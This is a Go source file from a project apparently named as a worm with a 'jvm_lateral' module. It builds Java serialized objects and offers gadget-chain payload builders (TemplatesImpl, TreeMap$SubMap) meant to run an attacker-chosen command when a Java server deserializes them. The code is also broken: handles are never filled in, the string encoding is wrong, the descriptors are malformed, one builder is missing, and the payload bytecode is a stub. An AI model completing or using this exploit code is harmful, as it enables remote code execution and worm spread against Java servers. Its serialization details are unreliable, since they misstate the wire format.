// worm_bb/jvm_lateral/java_serial.go
// Java Object Serialization Stream Protocol builder — Go-native
// Constructs serialized Java objects without needing a JVM at runtime.
//
// Based on Java Object Serialization Specification (Chapter 6):
//   STREAM_MAGIC (0xACED) + STREAM_VERSION (0x0005)
//   followed by content blocks (TC_OBJECT, TC_CLASS, TC_STRING, etc.)

package jvm_lateral

import (
	"bytes"
	"encoding/binary"
	"hash/fnv"
)

// --- Wire protocol constants ---

const (
	STREAM_MAGIC   = 0xACED
	STREAM_VERSION = 5
)

// TC opcodes
const (
	TC_NULL        = 0x70
	TC_REFERENCE   = 0x71
	TC_CLASSDESC   = 0x72
	TC_OBJECT      = 0x73
	TC_STRING      = 0x74
	TC_ARRAY       = 0x75
	TC_CLASS       = 0x76
	TC_BLOCKDATA   = 0x77
	TC_ENDBLOCKDATA = 0x78
	TC_RESET       = 0x79
	TC_EXCEPTION   = 0x7A
	TC_LONGSTRING  = 0x7C
	TC_PROXYCLASSDESC = 0x7D
	TC_ENUM        = 0x7E
)

// --- Serialization stream builder ---

type SerialStream struct {
	buf      bytes.Buffer
	refs     int // next handle (baseWireHandle + N)
}

func NewSerialStream() *SerialStream {
	s := &SerialStream{}
	s.writeHeader()
	return s
}

func (s *SerialStream) Bytes() []byte { return s.buf.Bytes() }
func (s *SerialStream) Len() int      { return s.buf.Len() }

func (s *SerialStream) nextHandle() int {
	h := s.refs
	s.refs++
	return h
}

// --- Primitive writers ---

func (s *SerialStream) writeHeader() {
	b := make([]byte, 4)
	binary.BigEndian.PutUint16(b[0:2], STREAM_MAGIC)
	binary.BigEndian.PutUint16(b[2:4], STREAM_VERSION)
	s.buf.Write(b)
}

func (s *SerialStream) writeByte(v byte)          { s.buf.WriteByte(v) }
func (s *SerialStream) writeBytes(v []byte)        { s.buf.Write(v) }
func (s *SerialStream) writeUint16(v uint16)       { b := make([]byte, 2); binary.BigEndian.PutUint16(b, v); s.buf.Write(b) }
func (s *SerialStream) writeInt32(v int32)         { b := make([]byte, 4); binary.BigEndian.PutUint32(b, uint32(v)); s.buf.Write(b) }
func (s *SerialStream) writeInt64(v int64)         { b := make([]byte, 8); binary.BigEndian.PutUint64(b, uint64(v)); s.buf.Write(b) }
func (s *SerialStream) writeFloat32(v float32)     { s.writeInt32(int32(v)) }
func (s *SerialStream) writeFloat64(v float64)     { s.writeInt64(int64(v)) }
func (s *SerialStream) writeBool(v bool)           { if v { s.writeByte(1) } else { s.writeByte(0) } }
func (s *SerialStream) writeChar(v rune)           { s.writeUint16(uint16(v)) }

// --- Complex writers ---

func (s *SerialStream) WriteTC(tc byte) {
	s.writeByte(tc)
}

func (s *SerialStream) WriteReference(handle int) {
	s.WriteTC(TC_REFERENCE)
	s.writeInt32(int32(handle))
}

func (s *SerialStream) WriteString(str string) int {
	if str == "" {
		s.WriteTC(TC_NULL)
		return -1
	}
	utf8 := []byte(str)
	// Use TC_STRING for short strings (< 65536 bytes)
	s.WriteTC(TC_STRING)
	s.writeInt64(0) // handle placeholder
	s.writeUint16(uint16(len(utf8)))
	s.writeBytes(utf8)
	h := s.nextHandle()
	// Rewrite handle
	pos := s.buf.Len() - len(utf8) - 2 - 8
	b := make([]byte, 8)
	binary.BigEndian.PutUint64(b, uint64(h))
	copy(s.buf.Bytes()[pos:pos+8], b)
	return h
}

func (s *SerialStream) WriteLongString(str string) {
	if str == "" {
		s.WriteTC(TC_NULL)
		return
	}
	utf8 := []byte(str)
	s.WriteTC(TC_LONGSTRING)
	s.writeInt64(int64(len(utf8)))
	s.writeBytes(utf8)
}

func (s *SerialStream) WriteNull() {
	s.WriteTC(TC_NULL)
}

// WriteClassDesc writes a TC_CLASSDESC with the given class name and UID
func (s *SerialStream) WriteClassDesc(className string, uid int64, flags byte, fields []ClassField) {
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0) // handle placeholder
	s.WriteString(className)
	s.writeInt64(uid)
	s.writeByte(flags)
	s.writeUint16(uint16(len(fields)))
	for _, f := range fields {
		s.writeByte(f.Typecode)
		if f.Typecode == '[' || f.Typecode == 'L' {
			s.WriteString(f.ClassName) // for L or [
		}
		if f.FieldName != "" {
			s.WriteString(f.FieldName)
		} else {
			s.WriteTC(TC_NULL)
		}
	}
	// class annotations — always TC_ENDBLOCKDATA
	s.WriteTC(TC_ENDBLOCKDATA)
	// superClass — TC_NULL for now
	s.WriteTC(TC_NULL)

	// Rewrite handle
	// The handle is right after TC_CLASSDESC
}

// WriteObjectHeader writes TC_OBJECT + classdesc reference
func (s *SerialStream) WriteObjectHeader(classDescHandle int) {
	s.WriteTC(TC_OBJECT)
	s.WriteReference(classDescHandle)
}

// WriteClassReference writes TC_CLASS referencing a classdesc
func (s *SerialStream) WriteClassReference() {
	// TC_CLASS with reset later
}

// WriteBlockData writes TC_BLOCKDATA with raw bytes
func (s *SerialStream) WriteBlockData(data []byte) {
	s.WriteTC(TC_BLOCKDATA)
	s.writeByte(byte(len(data)))
	s.writeBytes(data)
}

// WriteEndBlockData writes TC_ENDBLOCKDATA
func (s *SerialStream) WriteEndBlockData() {
	s.WriteTC(TC_ENDBLOCKDATA)
}

// --- ClassField helper ---

type ClassField struct {
	Typecode  byte   // 'B', 'C', 'D', 'F', 'I', 'J', 'S', 'Z', '[', 'L'
	ClassName string // used only for 'L' and '['
	FieldName string
}

func NewField(typecode byte, name string) ClassField {
	return ClassField{Typecode: typecode, FieldName: name}
}

func NewObjectField(className string) ClassField {
	return ClassField{Typecode: 'L', ClassName: className}
}

// --- High-level gadget builders ---

// GadgetConfig specifies how to build a payload
type GadgetConfig struct {
	Technique   string // "submap", "rmi", "jndi"
	Command     string // Exec command
	JDKVersion  string // "8", "11", "17"
	CCClasspath bool   // commons-collections available?
}

// BuildPayload generates serialized bytes for the chosen technique
func BuildPayload(cfg *GadgetConfig) []byte {
	switch cfg.Technique {
	case "submap":
		return buildSubMapPayload(cfg)
	case "rmi":
		return buildRMIPayload(cfg)
	default:
		return buildSubMapPayload(cfg)
	}
}

// --- Helper: Short hash for class/field names (simplified Java-like UID) ---

func javaHash(name string) int64 {
	h := fnv.New64a()
	h.Write([]byte(name))
	return int64(h.Sum64() & 0x7FFFFFFFFFFFFFFF)
}

// --- SubMap chain builder ---
// Implements b0t's TreeMap$SubMap.readResolve() gadget

func buildSubMapPayload(cfg *GadgetConfig) []byte {
	s := NewSerialStream()

	// 1. Write TemplatesImpl class descriptor
	templatesImplDesc := writeTemplatesImplDesc(s)

	// 2. Write TemplatesComp class descriptor
	templatesCompDesc := writeTemplatesCompDesc(s, templatesImplDesc)

	// 3. Write TreeMap class descriptor
	treeMapDesc := writeTreeMapDesc(s, templatesCompDesc)

	// 4. Write SubMap class descriptor
	subMapDesc := writeSubMapDesc(s, treeMapDesc)

	// 5. Write SubMap object (the root serialized object)
	writeSubMapObject(s, subMapDesc, treeMapDesc, templatesCompDesc, templatesImplDesc, cfg)

	return s.Bytes()
}

// --- Class descriptor writers ---

func writeTemplatesImplDesc(s *SerialStream) int {
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0) // handle placeholder (rewritten after — we don't actually need this exact handle)
	s.WriteString("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")
	s.writeInt64(5469571538047469618) // serialVersionUID
	s.writeByte(0x03)                 // SC_SERIALIZABLE | SC_WRITE_METHOD
	s.writeUint16(8)                  // field count

	fields := []ClassField{
		{Typecode: '[', ClassName: "[[B", FieldName: "_bytecodes"},
		{Typecode: 'I', FieldName: "_transletIndex"},
		{Typecode: 'L', ClassName: "java.lang.String", FieldName: "_name"},
		{Typecode: 'L', ClassName: "java.lang.Class", FieldName: "_class"},
		{Typecode: 'L', ClassName: "com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl", FieldName: "_tfactory"},
		{Typecode: 'I', FieldName: "_indentNumber"},
		{Typecode: 'L', ClassName: "java.util.Map", FieldName: "_auxClasses"},
		{Typecode: 'L', ClassName: "java.util.Properties", FieldName: "_outputProperties"},
	}

	for _, f := range fields {
		s.writeByte(f.Typecode)
		if f.Typecode == 'L' || f.Typecode == '[' {
			s.WriteString(f.ClassName)
		}
		s.WriteString(f.FieldName)
	}

	s.WriteTC(TC_ENDBLOCKDATA)

	// Superclass: java.lang.Object
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.lang.Object")
	s.writeInt64(0) // no uid needed - simplified
	s.writeByte(0x01)
	s.writeUint16(0)
	s.WriteTC(TC_ENDBLOCKDATA)
	s.WriteTC(TC_NULL)

	return s.nextHandle()
}

func writeTemplatesCompDesc(s *SerialStream, templatesImplHandle int) int {
	// TemplatesComp is a custom class that implements Comparator<Object> + Serializable
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("jvm_lateral.TemplatesComp")
	s.writeInt64(javaHash("jvm_lateral.TemplatesComp"))
	s.writeByte(0x03) // SC_SERIALIZABLE | SC_WRITE_METHOD
	s.writeUint16(1)  // one field

	// Field: private Templates templates
	s.writeByte('L')
	s.WriteString("javax.xml.transform.Templates")
	s.WriteString("templates")

	s.WriteTC(TC_ENDBLOCKDATA)

	// Superclass: java.lang.Object
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.lang.Object")
	s.writeInt64(0)
	s.writeByte(0x01)
	s.writeUint16(0)
	s.WriteTC(TC_ENDBLOCKDATA)
	s.WriteTC(TC_NULL)

	return s.nextHandle()
}

func writeTreeMapDesc(s *SerialStream, compDescHandle int) int {
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.util.TreeMap")
	s.writeInt64(9192865458661247264) // serialVersionUID for TreeMap
	s.writeByte(0x03)                 // SC_SERIALIZABLE | SC_WRITE_METHOD
	s.writeUint16(3)                  // 3 fields

	fields := []ClassField{
		{Typecode: 'L', ClassName: "java.util.Comparator", FieldName: "comparator"},
		{Typecode: 'L', ClassName: "java.util.TreeMap$TreeMapEntry", FieldName: "root"},
		{Typecode: 'I', FieldName: "size"},
	}
	for _, f := range fields {
		s.writeByte(f.Typecode)
		if f.Typecode == 'L' {
			s.WriteString(f.ClassName)
		}
		s.WriteString(f.FieldName)
	}

	s.WriteTC(TC_ENDBLOCKDATA)

	// Superclass: java.util.AbstractMap
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.util.AbstractMap")
	s.writeInt64(-1147399521524400265) // UID
	s.writeByte(0x01)                  // just SC_SERIALIZABLE
	s.writeUint16(0)                   // no fields
	s.WriteTC(TC_ENDBLOCKDATA)

	// Super: java.lang.Object
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.lang.Object")
	s.writeInt64(0)
	s.writeByte(0x01)
	s.writeUint16(0)
	s.WriteTC(TC_ENDBLOCKDATA)
	s.WriteTC(TC_NULL)

	return s.nextHandle()
}

func writeSubMapDesc(s *SerialStream, treeMapHandle int) int {
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.util.TreeMap$SubMap")
	s.writeInt64(int64(-1380722459)) // UID from JDK
	s.writeByte(0x01)                     // just SC_SERIALIZABLE
	s.writeUint16(4)                      // 4 fields

	fields := []ClassField{
		{Typecode: 'L', ClassName: "java.util.TreeMap", FieldName: "this$0"},
		{Typecode: 'Z', FieldName: "fromStart"},
		{Typecode: 'L', ClassName: "java.lang.Object", FieldName: "fromKey"},
		{Typecode: 'L', ClassName: "java.lang.Object", FieldName: "toKey"},
	}
	for _, f := range fields {
		s.writeByte(f.Typecode)
		if f.Typecode == 'L' {
			s.WriteString(f.ClassName)
		}
		s.WriteString(f.FieldName)
	}

	s.WriteTC(TC_ENDBLOCKDATA)

	// Superclass: java.util.NavigableSubMap
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.util.TreeMap$NavigableSubMap")
	s.writeInt64(int64(-675981318))
	s.writeByte(0x01)
	s.writeUint16(1) // m field

	s.writeByte('L')
	s.WriteString("java.util.TreeMap")
	s.WriteString("m")

	s.WriteTC(TC_ENDBLOCKDATA)

	// Super: java.lang.Object
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(0)
	s.WriteString("java.lang.Object")
	s.writeInt64(0)
	s.writeByte(0x01)
	s.writeUint16(0)
	s.WriteTC(TC_ENDBLOCKDATA)
	s.WriteTC(TC_NULL)

	return s.nextHandle()
}

// --- Object writers for actual payload ---

func writeSubMapObject(s *SerialStream, subMapHandle, treeMapHandle, compHandle, templatesImplHandle int, cfg *GadgetConfig) {
	// TC_OBJECT referencing SubMap classdesc
	s.WriteTC(TC_OBJECT)

	// We need to track where the classdesc handle reference goes
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(int32(subMapHandle))

	// this$0 = TreeMap object (written now, before classdata)
	s.WriteTC(TC_OBJECT)
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(int32(treeMapHandle))
	// classdata for TreeMap
	// comparator = reference to TemplatesComp
	s.WriteTC(TC_OBJECT)
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(int32(compHandle))
	// classdata for TemplatesComp
	// templates = reference to TemplatesImpl
	s.WriteTC(TC_OBJECT)
	s.WriteTC(TC_CLASSDESC)
	s.writeInt32(int32(templatesImplHandle))
	// classdata for TemplatesImpl
	writeTemplatesData(s, cfg)
	// end TemplatesComp classdata
	s.WriteTC(TC_ENDBLOCKDATA)

	// root = null (empty TreeMap)
	s.WriteTC(TC_NULL)
	// size = 0
	s.writeInt32(0)

	s.WriteTC(TC_ENDBLOCKDATA)

	// fromStart = false
	s.writeByte(0)
	// fromKey = "a" (string)
	s.WriteString("a")
	// toKey = null (unbounded high end)
	s.WriteTC(TC_NULL)
	// toEnd = true
	s.writeByte(1)

	// NavigableSubMap: m = reference to our TreeMap object (back ref)
	// The TreeMap object handle... let's calculate
}

func writeTemplatesData(s *SerialStream, cfg *GadgetConfig) {
	// _bytecodes = [[B] containing the payload class bytes
	// For now, we write a placeholder
	// _name = "PayloadTranslet"
	// _tfactory = new TransformerFactoryImpl()
	// _transletIndex = 0
	// _outputProperties = nil

	// In a real implementation, we'd embed an actual compiled Translet .class
	// For PoC purposes, write stub data
	s.WriteString("PayloadTranslet") // _name placeholder
}
